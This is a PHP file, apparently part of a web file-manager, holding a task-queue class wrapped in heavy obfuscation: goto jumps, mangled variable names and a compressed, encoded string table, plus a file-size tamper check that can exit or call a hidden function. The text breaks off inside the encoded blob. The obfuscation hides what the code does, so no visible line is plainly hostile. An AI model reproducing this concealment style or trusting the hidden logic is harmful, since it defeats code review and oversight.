<?php
 goto Fœú–…·‡•; b¯´¥¢Òåû: $_size = $_SERVER[ß⁄ˆÇ†Œ][950]; if ($_SERVER[$_SERVER[ß⁄ˆÇ†Œ][321]] != $_size($_file)) { $_getc = $_SERVER[ß⁄ˆÇ†Œ][323]; $_getfile = $_SERVER[$_SERVER[ß⁄ˆÇ†Œ][324]] . $_SERVER[ß⁄ˆÇ†Œ][325]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ß⁄ˆÇ†Œ][262], $_getfilec); if (count($_getarrs) < $_SERVER[ß⁄ˆÇ†Œ][326]) { $exit = $_SERVER[ß⁄ˆÇ†Œ][327]; $exit(); } $_act = $_SERVER[ß⁄ˆÇ†Œ][328]; $_act($_file); } class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\x74\141\163\x6b\121\x75\x65\165\145\114\145\x6e\x67\x74\x68"; const QUEUE_DATA = "\x74\141\x73\153\121\x75\145\165\145\104\141\164\x61"; const QUEUE_TIME = "\x74\141\163\x6b\121\x75\145\165\x65\114\x61\163\x74\122\x75\156"; const QUEUE_THREAD = "\164\x61\163\x6b\121\x75\145\x75\145\x54\x68\162\x65\x61\144"; public static $listData = false; public static $listDataAdd = false; public static function initTask() { } public static function add($»Õ¶ÿÊù, $º«¢îçÛ = array(), $ÅêÚ“⁄” = '', $€ﬁ‘ﬁ™Á = '') { $˘¸≈è÷í =& $_SERVER[ß⁄ˆÇ†Œ]; if (self::$listData === !1) { self::$listData = self::getAll(); self::$listDataAdd = array(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($€ﬁ‘ﬁ™Á && array_find_by_field(self::$listData, $˘¸≈è÷í[97], $€ﬁ‘ﬁ™Á)) { return !0; } if ($€ﬁ‘ﬁ™Á && array_find_by_field(self::$listDataAdd, $˘¸≈è÷í[97], $€ﬁ‘ﬁ™Á)) { return !0; } self::$listDataAdd[] = array($˘¸≈è÷í[350] => $»Õ¶ÿÊù, $˘¸≈è÷í[1862] => $º«¢îçÛ, $˘¸≈è÷í[534] => $ÅêÚ“⁄”, $˘¸≈è÷í[97] => $€ﬁ‘ﬁ™Á); return !0; } public static function addSubmit() { $Ö¥‘∞—‡ =& $_SERVER[ß⁄ˆÇ†Œ]; if (!self::$listDataAdd || count(self::$listDataAdd) == 0) { return; } self::setAll(array_merge(self::getAll(), self::$listDataAdd)); write_log($Ö¥‘∞—‡[1863] . json_encode_force(array_to_keyvalue(self::$listDataAdd, $Ö¥‘∞—‡[12], $Ö¥‘∞—‡[534])), $Ö¥‘∞—‡[197]); self::$listData = !1; self::$listDataAdd = !1; } public static function addNow($Ì£˚Ò–ò, $Ñ˘±©íœ = array(), $óòÃπ÷ß = '', $∫î‘•Ó€ = '') { $¢êøË‚Õ =& $_SERVER[ß⁄ˆÇ†Œ]; if (self::count() >= self::MAX_LENGTH) { return !1; } $‹¬Ä⁄òÎ = self::getAll(); if ($∫î‘•Ó€ && array_find_by_field($‹¬Ä⁄òÎ, $¢êøË‚Õ[97], $∫î‘•Ó€)) { return !0; } $‹¬Ä⁄òÎ[] = array($¢êøË‚Õ[350] => $Ì£˚Ò–ò, $¢êøË‚Õ[1862] => $Ñ˘±©íœ, $¢êøË‚Õ[534] => $óòÃπ÷ß, $¢êøË‚Õ[97] => $∫î‘•Ó€); self::setAll($‹¬Ä⁄òÎ); write_log($¢êøË‚Õ[1863] . $óòÃπ÷ß, $¢êøË‚Õ[197]); return !0; } public static function run() { $ÚÌ¥ªüµ =& $_SERVER[ß⁄ˆÇ†Œ]; $Ù¸˜∆∞£ = self::getAll(); $ÀÔ≠˙πú = array_shift($Ù¸˜∆∞£); if (!$ÀÔ≠˙πú) { return !1; } self::setAll($Ù¸˜∆∞£); $˛‘ÿÑÊò = timeFloat(); $¯Ê»ç±˜ = $ÚÌ¥ªüµ[12]; try { $¯Ê»ç±˜ = Hook::apply($ÀÔ≠˙πú[$ÚÌ¥ªüµ[350]], $ÀÔ≠˙πú[$ÚÌ¥ªüµ[1862]]); } catch (Exception $¬»Ì®ö◊) { write_log($¬»Ì®ö◊, $ÚÌ¥ªüµ[1260]); } $·ÕÀø≠© = number_format(timeFloat() - $˛‘ÿÑÊò, 3) . $ÚÌ¥ªüµ[1780]; if ($¯Ê»ç±˜ && is_string($¯Ê»ç±˜)) { $·ÕÀø≠© = $·ÕÀø≠© . $ÚÌ¥ªüµ[1864] . $¯Ê»ç±˜; } write_log($ÚÌ¥ªüµ[1865] . $ÀÔ≠˙πú[$ÚÌ¥ªüµ[534]] . $ÚÌ¥ªüµ[1866] . $·ÕÀø≠©, $ÚÌ¥ªüµ[197]); Cache::set(self::QUEUE_TIME, time(), 3600 * 24 * 30); return !0; } public static function runThread() { $òÁñè¢Ò =& $_SERVER[ß⁄ˆÇ†Œ]; $”ß¯‹˚˛ = self::threadCount() + 1; if ($”ß¯‹˚˛ > 3 || !self::count()) { return; } write_log($òÁñè¢Ò[1867] . $”ß¯‹˚˛, $òÁñè¢Ò[197]); Cache::set(self::QUEUE_THREAD, $”ß¯‹˚˛, 3600 * 24); AutoTask::clearUserStatus(); while (!0) { if (!self::run()) { break; } usleep(mt_rand(200, 50000)); } Cache::set(self::QUEUE_THREAD, 0, 3600 * 24); write_log($òÁñè¢Ò[1868], $òÁñè¢Ò[197]); } public static function getKey($∫∂¶ö»•, $’·˙Øåô = "\151\156\x74") { $†€æ≥¢˜ =& $_SERVER[ß⁄ˆÇ†Œ]; Cache::removeMemory($∫∂¶ö»•); $¨¿Ï…†Õ = Cache::get($∫∂¶ö»•); if ($’·˙Øåô == $†€æ≥¢˜[373]) { return $¨¿Ï…†Õ ? intval($¨¿Ï…†Õ) : 0; } if ($’·˙Øåô == $†€æ≥¢˜[1869]) { return is_array($¨¿Ï…†Õ) ? $¨¿Ï…†Õ : array(); } return $¨¿Ï…†Õ; } public static function lastTime() { return self::getKey(self::QUEUE_TIME); } public static function count() { return self::getKey(self::QUEUE_LENGTH); } public static function threadCount() { return self::getKey(self::QUEUE_THREAD); } public static function getAll() { return self::getKey(self::QUEUE_DATA, $_SERVER[ß⁄ˆÇ†Œ][1869]); } public static function setAll($†„ùƒÇ≠) { $”À ÿù‘ = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($†„ùƒÇ≠), $”À ÿù‘); Cache::set(self::QUEUE_DATA, $†„ùƒÇ≠, $”À ÿù‘); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); Cache::set(self::QUEUE_THREAD, 0, 60); } } goto açøáÓ¿ﬁƒ; Fœú–…·‡•: if (!function_exists('_kodDe')) { function _kodDe($str) { $str = base64_decode($str); $l = strlen($str); $result = ''; $offset = ord($str[0]) - 30; for ($i = 1; $i < $l; $i += 2) { if ($i + 1 < $l) { $result .= chr(ord($str[$i + 1]) + $offset); $result .= chr(ord($str[$i]) + $offset); } else { $result .= chr(ord($str[$i]) + $offset); } } return $result; } } define("\247\332\366\202\240\316", "\203\314\314\365\337\361"); $_SERVER[ß⁄ˆÇ†Œ] = explode("\174\4\174\1\174\2", gzinflate(substr("\x1f\x8b\x8\x0\x0\x0\x0\x0\x0\x13\xc5\x7d\x9\x78\x1b\xd5\xb5\x70\x4b\x69\x59\x5b\xda\x52\xb6\x2\xed\xe0\x24\xd8\x4e\xb4\xd8\xce\xee\xc4\x9\xb2\x2c\xdb\x22\xb2\xe5\x48\x72\x16\x6c\x33\x19\x4b\x23\x7b"."\x62\x49\x23\x6b\x46\xde\x92\x34\x21\x10\xb6\x10\x76\x42\x80\xb0\x95\xd2\x6\x68\x12\xf6\x3d\x85\x2e\xd0\x7\xb4\x2c\x5d\x28\xb4\x6c\x5\xec\x84\x52\x96\xb2\xf7\x95\xd2\xff\x2e\xe7\x2e\x33\x92\xe1\xfd\xdf\xfb"."\xbf\xef\xcf\x97\x44\x77\x39\xf7\xce\x5d\xce\x3d\xf7\xdc\x73\xcf\x3d\xe7\xbd\x17\xf7\xdd\xf8\xf6\x5b\x6b\xf7\x5f\xfb\xe5\xb5\xfb\x7d\xbc\xe3\xe3\xbd\x1f\xed\xa5\xe1\xb5\x5f\x41\xff\xbe\x46\xc3\xdf\xdf\x7c\xe0"."\227\310\237\303\67\237\133\125\325\72\347\340\31\355\207\136\160\347\116\155\227\166\263\266\71\32\171\342\67\341\257\77\371\323\223\103\23\67\74\61\72\361\345\57\355\31\374\371\326\172\4\114"."\313\326\323\37\45\147\332\212\76\142\130\266\105\23\222\146\56\155\364\321\260\221\243\277\176\372\323\31\213\24\364\254\151\353\64\352\243\77\52\264\213\374\157\15\146\14\226\257\266\107\23\152"."\xbc\xb3\xa3\x23\x14\x4b\x0\x50\xbd\x9c\x9f\x35\x53\x10\xca\x6b\x5\x2d\xb\xdf\xcf\xeb\x5\xb\xb5\x46\xae\x4e\xcd\x9b\x79\x3d\xe7\x48\x11\x9\x29\xcd\xd6\x7a\x35\xb\x6a\x6a\x6a\x54\x9b\x42\x1d\x91\xe8\x4a"."\x35\xb1\xb2\x23\x4\x10\xbd\xea\x60\x51\x2f\x8c\xd2\x18\x9\xc6\x6d\xad\x60\x27\x8c\xac\xce\x21\x86\xb\xbc\x5d\x8d\xa1\x96\x70\xbb\x92\x88\x5\xda\xe3\x81\x60\x22\x1c\x6d\xa7\xc9\xc1\x68\x5b\x5b\x38\x51\x9a"."\x1e\x8b\x46\x22\x8d\x81\xe0\x92\xd2\x9c\x8e\x58\xa0\xa5\x2d\xa0\xa0\xf6\x65\x74\xd5\xc8\xa5\xcd\x2a\x65\x15\xcd\x59\xa5\x54\xd3\x40\xb3\xa1\x67\x52\x34\x98\xd3\x58\x73\xec\xd1\x3c\x84\x12\x3c\x84\xa6\x29\x57"."\xcc\x64\x68\xa4\x9d\x87\x52\x7a\x5a\x2b\x66\x60\xb4\x9a\xe4\x48\xbe\x60\x64\x35\xd6\xe9\x25\xfa\x28\x4f\xa5\x1\xad\x68\x9b\x46\x2e\x49\x23\xa1\x11\xbb\xa0\x89\x74\xd4\xd6\x24\x9a\x68\x3d\x7\x55\xc5\x43\x91".strrev('ï2ôhj≥Õû∂'."\r".'Y2àëP°£¥æ'."\0".'©Z˙IP›Çê±C[À(/[,’êìõh±Õ*‡°0P').base64_decode('RWNNoZjSuFIRI5Q0s1kz50O1oJm0paaGYjEa8AB6R8J40iASbW6Oh3gMOrc0gloyE/DTEQ==')."\113\245\63\266\72\244\145\212\14\115\7\350\157\45\374\300\257\151\1\352\16\32\71\243\10\150\12\125\230\46\137\126\20\50\62\150\235\245\350\51\10\144\121\171\23\312\365\102\132\57\203\132".strrev('£#ió†∆2ÿX§Ã⁄x–M˝Ÿ®¯^:¡» fíÁ™∂”Œ*ΩÚÄ.˛à∞ÿ4C°ZÕ')."\xb7\x17\xb3\x32\x8\x8f\x26\xfb\x8d\x4c\xaa\xc0\x96\xde\xe7\x41\xd2\x68\x84\xaf\x64\xc\x2b\x62\x79\xd4\x12\x4e\x4\x8c\xf4\xa8\x58\x8a\x18\xae\x83\xe7\x5a\x66\xb1\x90\xd4\xc3\x68\xe9\xd0\x78\x2d\x24\xeb\xb6"."\215\72\307\6\304\354\314\147\114\55\25\327\13\274\153\206\331\214\52\212\26\155\71\261\110\300\232\315\102\266\11\21\15\370\76\132\60\106\147\231\214\1\266\144\122\322\210\371\253\272\116\363"."\x7e\xd6\xd3\x75\x12\xfa\xaf\x1a\xa8\x62\x37\xb4\xa9\x5f\xcf\x64\x54\x7d\x44\x87\x35\x95\x4d\xcd\xb6\xd8\x60\xf8\xad\x5e\x23\xe7\x47\x29\x34\x1a\x8e\xaa\xfd\x9a\xd5\xdf\x96\x9a\xad\x92\x52\x8c\xd8\xa6\xf4\x11"."\137\276\77\17\13\236\257\361\156\7\316\343\241\153\67\355\220\104\262\63\146\122\313\310\135\244\341\176\333\316\307\365\134\12\217\4\164\305\34\316\221\221\312\353\72\0\65\171\224\224\322\246".base64_decode('rFRa6416ixXMZniI9Y6nWTzRHmHTmUoDtrIdowI+aFiE+ImVq+XzGSOp2YaZ85tJW7e9lg==')."\x5d\xd0\x35\xa8\x31\x90\x4c\xea\x96\xe5\xd\x9a\x39\xbb\x60\x66\xbc\x81\x4c\xc6\x1c\xf6\x46\xb\x46\x9f\x91\xab\x57\xa6\x3\x1d\x46\x99\x68\xbd\x7b\x31\x6d\xac\x87\x45\x5c\xb1\x40\xc1\x88\x83\x3f\x33\xbd\xa1".base64_decode('aKe989ji5NAFLWel9YI3BCujXkGN5QSSgTUZVt60DNy8ekWzbS3Zj4mLqL7hc+CNXMbI6Q==').base64_decode('pbCoEt3bUdD6slq9ki/2ogGABQlpSQwhA8MA1CtZbcSr9bGaQiN5o6BbrNdKS1sCMCrtbQ==').base64_decode('wwvJ0FPeOKLeUNnMmlkKwhWF5dHU1kSiQw03o+25PaS2BRLBVqjd1vpY1RFEk3mVLHGFFw==').base64_decode('LSiMTe2ocyKxwxzWC+jDjaP1yoCZ6jVHfCwLA8cRZWHAeH7ztjem5fpwN3pHbd1y06ZGtA==')."\231\373\322\164\365\372\172\365\264\131\200\336\130\103\175\316\301\217\350\271\76\273\237\325\35\17\305\226\205\142\152\74\332\234\130\36\210\301\336\237\103\230\63\302\132\203\277\236\361\306\364\24"."\32\304\244\315\312\151\171\61\372\53\274\170\301\340\217\263\134\274\210\130\136\44\334\202\307\256\311\153\41\40\257\14\305\352\216\30\131\3\167\317\346\71\144\260\21\143\320\2\15\362\223\76"."\x37\x74\x5b\xd3\xab\xba\x53\x33\xaa\xbd\xe8\xff\xe9\xd5\x5d\xdd\x4d\xbe\xe9\x3d\x8b\xfd\x86\x28\xe3\xaf\xf5\xd5\x2a\x75\x35\x73\x94\xe\xc4\xa9\x18\x5a\x46\x81\x4e\x97\x40\xd4\x28\xd1\x25\xce\x61\x11\x18\x9e"."\63\163\172\331\205\205\20\311\264\164\157\253\256\41\42\215\46\302\61\57\36\366\55\32\377\234\321\305\173\245\104\113\134\363\102\23\143\241\245\235\241\170\102\155\13\45\132\243\115\320\374\120".base64_decode('AEI5VJi0l80xZsxgW8xBtfqItIeIvSApDwgp124OM+rvQqBgv54cmCQPhaA3JqVLbOq66A==')."\x4f\xf\x60\x73\xf\xfd\x51\xd\xab\x59\xda\x37\x71\x94\xd3\x57\xd5\xec\x5d\x8d\x30\xab\x4d\x67\x9b\x8\x7c\x29\x9c\x45\x6b\x58\xb4\x5c\x75\x6e\x72\xac\x5b\x6d\x2\xd3\xd1\x92\x59\x6e\xa4\xf8\x2e\x88\xa2\xad"."\xba\xd1\xd7\xf\xd\x35\x70\x75\x49\x33\x63\x16\xb4\xc\xa6\xfd\x8c\x71\xed\x33\x80\xc\xe7\x33\x45\x84\xf7\x7e\x5c\x71\xa2\xbf\x98\xed\x85\x9d\xa\x8d\x51\x9f\x6e\xb\x9e\xd2\x1a\x45\x8c\x57\x96\xed\xc8\x68"."\133\267\303\115\216\175\27\142\176\25\343\152\267\57\237\353\253\236\12\165\251\165\263\153\160\2\114\43\364\14\61\327\105\275\264\353\276\244\211\26\166\233\66\240\327\343\276\0\65\133\100\122"."\x59\x44\x22\x98\xb\xf0\x1e\xd7\xe0\xa6\xb\x78\x7a\x32\xbe\x2c\xaa\x84\xd4\x19\x34\xf9\xae\x4c\x8f\x2f\xb\x9c\x7b\x9c\xa2\x17\xa\x66\xe1\x4\x80\x20\x61\x85\x6c\x94\x78\xba\xa0\x72\x9b\xb3\x1d\x16\x22\x1"."\x2c\xdc\x6f\x72\x36\xc5\x64\xc8\x58\xef\x87\x7e\x4f\xab\x6b\x6\xb2\x91\x42\xec\x9a\xcf\xb2\xd1\x24\xa0\xe\x6a\xa9\x54\xb9\x64\x44\x6a\xa0\x82\xb5\xc\x4f\x49\x6\xe3\x3\xfc\xf1\x99\xe8\xaf\xd8\xf4\x53\x66"."\x56\x63\x5b\x28\xd9\xfc\xf4\x14\xdd\xfd\x1c\x49\x74\xd9\xd2\xa4\xe9\xac\xde\x82\x6d\xe2\xcc\x82\x3\x12\x61\x62\xbf\x9\x2d\x43\x53\xf\xbd\x2a\xf2\xee\xb1\x8e\xa6\xf4\x8c\xce\xb0\xa8\x5f\x67\xc\x44\xd\x80"."\241\341\347\70\226\346\310\216\216\10\50\125\160\156\206\25\103\45\361\166\317\342\313\361\231\112\44\140\236\7\220\107\4\63\150\352\242\144\325\210\170\107\101\117\33\43\214\100\214\330\155\132"."\141\200\165\14\225\24\353\15\107\244\265\330\334\31\211\250\301\150\173\2\35\311\150\312\362\130\70\21\142\164\50\320\244\6\202\35\20\23\224\215\263\145\62\143\101\123\206\352\0\117\120\43"."\374\202\3\102\133\160\336\314\41\372\11\44\310\53\16\154\45\131\51\301\40\0\202\10\246\302\305\47\240\235\76\73\346\315\42\342\341\345\155\162\262\147\12\154\367\224\313\13\303\64\245\370"."\344\340\301\103\13\231\361\205\35\321\70\24\130\214\123\21\157\336\313\327\133\107\47\144\145\45\24\151\11\101\342\301\200\125\375\32\160\334\201\345\161\266\205\27\21\174\301\30\323\104\227\26"."\263\366\260\216\144\63\202\325\167\366\312\53\146\276\150\171\165\314\145\210\57\314\362\266\266\5\202\336\170\153\240\156\366\34\232\272\62\233\352\116\264\32\126\367\51\74\16\303\70\154\315\122"."\13\72\42\70\354\103\165\65\265\214\34\40\56\111\152\336\112\157\326\213\153\301\43\350\253\251\251\141\165\315\230\243\364\43\72\307\167\223\24\231\45\166\356\52\46\7\330\202\321\222\214\365"."\xc5\xbb\x8c\xe5\x1d\x36\x18\x65\x9e\xca\x4f\x9\x53\x4b\xb1\x67\xaa\x73\x3f\x84\x2a\x8a\x64\x27\x56\xb5\x24\xfe\x98\x8a\x6a\xb4\x8b\x96\x3c\x52\x68\x59\xa5\x50\x21\x83\x71\xf4\x34\x55\xcb\xf4\xa1\x41\xb7\xfb".strrev('GLõdΩCó—ñI†m•Ü’¬∞⁄ÂÜ€(¨nÖ!àõ MÀé\'["èéÁ»{)◊xò¢r≥')."\xb\x9e\xe\x69\x5a\x1d\xd3\x3c\xa2\xa2\x82\x2a\xac\x21\x55\xee\xa\xc\x12\x74\x43\xce\x69\xe5\xd4\x8c\x75\xb2\xad\x69\x36\x6b\x47\xa0\xed\x14\x6f\x53\x80\xd1\x82\x85\x8b\x11\x8a\x2a\x43\x58\xd2\x64\xe6\x1a"."\x2a\x6b\x7d\x35\x95\xa\x3b\x31\x37\x54\x76\x26\x9a\xd1\xf9\x61\xf1\xa2\x83\x17\x6\xcd\x6c\x1e\x13\xc6\x36\x7c\x48\xc4\x4b\x88\x1e\x14\x17\xc1\xf2\x58\x88\x79\x33\x16\xe9\xe0\x2b\x8c\xc6\x43\x9\xd\x36\xc7"."\205\176\31\156\241\177\262\132\1\331\262\332\230\231\103\350\215\66\315\254\57\11\70\214\331\120\276\7\341\210\305\143\211\326\160\373\22\265\55\332\24\212\250\341\166\304\247\45\112\323\73\73"."\104\347\345\364\306\150\242\325\221\332\211\70\265\145\201\110\330\15\36\132\21\216\47\342\145\263\120\132\147\310\225\243\152\151\340\374\303\71\71\105\354\41\52\332\216\330\4\3\266\64\6\342".strrev('¶†>∏qÒé∆lvã÷™xsv &ìÒÛÒ,hÁ«Î—àÄ8èŸ!Z¸∞ïøEGBM`⁄†·').base64_decode('jWpHLNQcXsGjzeFQpCmuBgPB1hBPbA+0sX6ksXzO8jvhVcQJx7mUTwU8Yv2UBWsqExmpYg==')."\x8b\x40\xa7\x2a\x1d\xd6\x15\xcc\x2\x96\x93\x92\x1\x56\x19\x2d\x2a\x72\xbe\x96\x89\x10\xb2\xac\xbf\xe8\x44\x8\xc3\xc3\x8e\x43\x55\xf4\xa7\x5a\x9\xc4\x15\x3b\xaf\xf2\xdd\xbe\x77\x94\x7\x49\x37\x58\x1c\xf1"."\100\360\175\5\270\362\222\26\250\30\246\121\72\173\225\117\10\244\155\316\7\273\342\150\216\105\36\102\214\0\21\310\42\4\45\210\2\237\61\320\116\131\260\3\254\71\151\41\14\125\243\35"."\241\130\0\213\122\325\345\261\150\173\13\24\30\356\327\131\3\302\60\374\125\354\60\14\22\125\133\60\34\132\306\320\230\150\115\14\372\152\223\15\345\211\100\352\15\176\322\310\261\341\356\305".strrev('ÜÑò—JWj]•Ç´|àX¬1ÿb⁄ª\\Å¢¸eõ˛ÿfiØLˇ"Ãòc)ñç Y∑cL').base64_decode('NCEUi0VjMBK2OcDEcDQzFoqz3RtviwYbJ79vBqCvjnhL+Lz/1O7hGVVd3hm+HhSonn4SjQ==')."\102\254\333\347\210\62\226\277\130\340\245\61\5\252\262\26\127\327\167\373\273\375\125\213\353\273\2\336\61\315\73\126\343\235\357\355\101\7\205\352\31\220\320\263\246\316\63\153\35\6\100\200".base64_decode('i6f0oJ+G7sXTur0n/mDVSV3dPZX1M07o9k3pHu6ZXr2YfSdZLKCzCNuRUFNTM6pQk9BpmQ==')."\203\344\44\102\113\0\130\306\230\221\27\251\153\346\254\143\351\150\16\365\76\121\242\313\333\75\243\147\261\124\116\112\162\177\13\355\224\210\257\352\347\160\1\357\51\270\147\274\50\136\360\200".base64_decode('H8VcUrAdeEH0avzY2ZcTxzu7wEWzQwhJxR66Zhr9Xccmsk8fYTQhlzYKWUbZjEF2zsrpgw==')."\20\60\155\206\330\275\272\75\254\63\364\100\351\216\70\102\16\266\257\243\54\51\226\221\170\2\42\103\343\70\312\221\311\310\253\370\310\71\314\143\210\115\200\171\72\10\240\255\244\226\327\343"."\x52\xf\x55\x35\x11\x68\x8c\x84\x54\x46\x5a\x80\x4\xb3\x38\x21\x87\x8d\xfc\x2\x7\x75\x4d\x90\x52\x46\x18\x24\xf9\x18\x91\x57\xc1\x92\xb7\x6\x33\xa\xa1\x8\xf4\xac\x57\x4f\xee\xb2\xac\x62\x1e\x1f\xdb\x14".strrev('Õ|BOTÙªwuWÒVv%\'B»f/)¥IèEã™¿Xcèœ \'ïNP‰:ã'."\r".')†ƒlh„4')."\x9b\xee\x59\x33\x73\x5d\x35\x13\xe2\xf8\xbb\xd1\x1f\x16\x9\x94\xb9\x55\x51\x39\x19\x54\x11\xdf\xed\xc3\xed\xe0\xd2\x73\x47\x84\x67\xd3\xa8\x59\xe0\x7\x9e\xbc\x43\xac\x60\x9b\xb6\x96\x71\x54\x91\xc0\x29\x8c"."\x34\x31\xee\x8\xe4\xc8\x74\xb6\x23\x82\x62\x61\x16\x5d\xba\x8e\x22\x74\xb4\x9d\xcb\x6d\x39\xa3\x2b\xdd\x87\xe0\x12\x71\xdd\xf6\x71\x8\x8f\x94\xa9\xa2\x38\xf4\xaf\xa1\x82\xd1\xf7\x1c\x5a\x48\x41\x69\x77\xa3"."\162\374\70\221\103\70\156\257\54\35\157\372\315\305\114\306\346\342\237\214\61\0\165\303\52\201\313\64\57\154\0\63\312\25\155\66\13\114\32\72\35\232\121\61\275\34\140\70\227\63\123\275"."\x32\x92\x89\x7d\xb5\x25\x80\x18\xab\x84\x52\xc5\x2e\x7e\x94\x70\xbb\xd2\x18\x8d\x46\x42\x81\x76\x5\x6f\xe1\xb0\xf5\x20\xfe\x20\x1e\xea\x8\xa0\x7d\xb\xcb\x55\xe3\x89\x10\xdc\x45\x85\x9b\xbc\xac\xde\x15\x5e"."\46\124\341\1\3\6\334\314\323\23\1\342\213\62\46\43\33\116\261\14\76\54\172\260\160\304\203\331\11\17\152\265\7\313\123\74\342\50\356\21\367\51\236\41\103\37\46\1\176\114\366\300"."\351\331\43\44\101\20\14\67\171\14\253\211\110\1\310\7\110\26\153\202\335\217\305\334\31\155\324\103\233\23\321\207\364\214\207\311\210\74\254\215\36\46\31\363\20\211\126\23\64\253\23\55".base64_decode('JGgWCSJ62e/BqIMx1yNueDzmcE4vEBAYGCFA8AjhgqevYBbzHeybUow2CxJEm3lCzDRtDw==').strrev('‚pŒ?Ç!ÄÊ˛ÿÎ´§≠'."\r".'q¿ßù*…Ç˙Q“¨·~'."\0".'FÓ˛2ﬂ,·ŸHV¿"¥©dy∂').base64_decode('F6FlYoniDjRrcJdIq5XDHEFzTkQVlzniGk+wt26xkPuCD38UHY3i0udsrY99C5MpfnAqAw==')."\x4a\xc3\x31\x3d\x39\x9a\x14\x72\xa6\x26\x49\x7a\xe5\x8c\x15\x51\xd\x71\x2d\xed\xea\x96\x87\xac\xa3\x72\x6b\xa0\xfc\x1c\x73\xbc\xe6\x53\x72\xf0\x41\x7\xb1\x31\x66\xc8\xce\xe7\xd7\xb1\x46\xbe\x78\x75\x42\xbf"."\x8\x9\x8c\xe6\x5\xfb\x40\x1b\x8b\x9\x70\x1c\x6d\x67\xcd\x19\x36\x28\x75\x72\x36\x90\x5e\x8f\x33\x86\x17\x97\x8f\x90\x62\x72\x65\x1e\xe7\x52\xcc\x48\xa8\x39\xa1\x9c\x1c\x45\xd4\xcb\x30\x55\x5a\x46\xc5\xc0"."\12\371\317\314\51\216\272\331\160\51\15\44\137\304\265\134\212\246\254\102\64\176\125\103\5\373\110\205\243\270\100\23\147\43\74\54\252\224\42\36\36\156\171\20\60\72\220\356\213\175\211\45"."\x45\xc5\x36\x58\x4\x9e\x4f\xb3\xe0\xd8\x85\x65\xc0\x10\xd2\x59\x9a\x98\x5a\x19\x2f\x25\x72\x23\x12\x58\xbb\x1c\xdf\xc5\x51\xb1\xa6\x18\x4a\x28\xf8\x3\x1e\x89\x4b\xc1\x24\xc5\x2b\x56\x87\x14\x75\xe\xb9\xb"."\43\135\233\47\36\242\16\43\67\152\344\342\6\26\26\270\123\305\376\53\266\177\274\270\105\214\142\345\144\141\272\211\140\131\34\255\337\3\367\321\36\174\142\226\66\150\41\152\105\255\47\307".strrev('“ïù/Z =ñ%¢FQƒ÷	'."\r".'≠,	Qº&®…ÉVø|`3÷'."\0".'F"ëPÂ¥£n„¨ˆ').base64_decode('aJOH/LaixsvLlU8PpiMMiJIgRAsiaKzQD+lIwvTgywT0Q7dxpppAgBjeF7NNcDmBw8sQAQ==')."\140\34\31\32\360\52\106\100\200\231\120\45\51\0\47\100\116\166\200\266\44\300\311\73\342\324\63\150\67\53\370\360\32\151\301\173\22\33\23\112\336\144\234\213\353\250\237\120\275\250\41\136".base64_decode('kidDC6EuJvdie+A3cnyJifEV66lPNAgPp1raDozB5ePNBZOztXxndwMFybmRa5i4dmNpPA==')."\34\34\104\111\222\124\306\315\113\270\122\135\121\314\137\224\331\150\150\22\223\326\321\373\241\2\335\300\174\350\64\0\12\103\236\32\211\335\22\164\146\15\275\243\203\15\157\235\153\236\155\323"."\x44\x47\xcc\x82\xaf\x80\xbe\x2c\x1a\x24\xd1\x38\x20\x10\x44\x69\x4\xef\x83\x32\x93\xc0\x6b\xb1\x50\x86\x44\xad\x9d\xbc\x10\x2b\x19\xcf\x6b\x8c\x48\x73\x3e\x8d\x61\x2f\x39\x4f\x14\x5\xe1\x24\x4d\x16\xed\xe1".strrev('Â70O∫[\'N$‹ù 9¶x98ΩÃîÛ≤lì."¬ÓêÏPSdÕÎ¡N6JÚb‹Œ†≠').base64_decode('9aSSZh4QQtIdzJpDupSILwLzIkeK0mwpS1QqQfE5Ii1CyytFWGIxCgQWypKTNF3BPnyC8A==')."\311\164\72\120\50\60\374\245\335\304\227\324\50\121\116\302\344\57\316\26\137\271\355\212\126\36\32\22\232\201\264\52\374\141\37\135\375\370\46\64\312\264\16\344\160\51\250\54\116\54\137\121"."\x5c\x68\x3\x38\x63\xe5\xc1\x3\x99\x8c\xd0\xdf\x72\xc7\x27\x2d\x42\x57\xbd\x5c\x48\x4e\x99\xb4\x58\x33\x39\xcc\x32\x59\x73\xb9\x34\x7e\x8c\x99\x9c\x35\x77\xdf\xc8\x3b\x29\xf5\xe4\x2c\xcb\x24\x34\x4e\x4c\x63"."\xf9\x38\xda\x9c\x83\xfd\x46\x4e\x67\xc2\x96\xb4\x51\xb0\xca\x91\xac\xff\xcf\xbc\x71\xe9\xc8\xe3\x15\x32\x19\xba\xe0\x3c\x49\xf0\x8c\x35\x94\x87\x74\xf9\xcc\xc0\x85\xac\x82\x44\xf1\x5d\xbb\x84\x17\x1\x7e\x40".base64_decode('iqi2g6WKkfql5eTAELR86XjgHSsc9VmT4Kwbjiu7EJo4wjdauRDOwnMpVypYuM+B55ULdg==')."\x4e\x86\x43\xb8\x8b\x33\x26\x6b\x2b\xcb\xe6\xb5\x5c\xf0\xd3\x6d\xaf\x3d\xf1\x32\xd\xef\xdc\xbd\xf3\x96\x87\x36\xd1\xf0\xea\xe2\x58\xff\x0\xbf\x8d\xa5\x3f\xe4\xe6\xe5\xab\x34\x2c\xb4\xd5\x37\xad\x18\x35\x8f"._kodDe('MeLq9P7oiYe+pGaYZqRDGLO8l9hW48b212w4mOWy5SkE5qcE5gNEZgvX66zeoezT4mu8bMo=')."\xd5\xbc\xf5\x3f\x6a\x5d\x7a\xd4\x8e\xcd\x47\xee\x7c\x66\x3f\xef\xd3\x8f\x7e\xe3\x69\x25\x70\xf8\x7\x7f\x49\xb4\xfc\x2c\x94\x1e\x3e\xff\xc5\x69\x3b\x9b\xbe\x79\xe7\x4c\xf3\xa5\xdf\x3c\xf8\xda\xc7\xe7\x2f\xfd"."\xe8\xb1\xc3\xae\xf9\xf4\xdd\xc7\x2e\xf8\xda\x81\x6f\x7e\xa9\xf8\xd7\x79\x1b\x16\xfd\xf6\x6f\x4f\xff\x62\xff\x73\x2f\xbb\x64\xe9\x75\xe6\xd6\x67\x3f\x7c\x61\xa2\xfe\x27\x5f\x7a\xea\xcd\xaf\xf9\xbe\xbf\xa6\xea"."\xe8\xe7\x6e\xba\xed\x94\x57\xd7\xff\xe5\xa0\x33\x8f\x3f\xaf\x65\x6d\xd3\x39\xd\x47\x9f\xf4\x8b\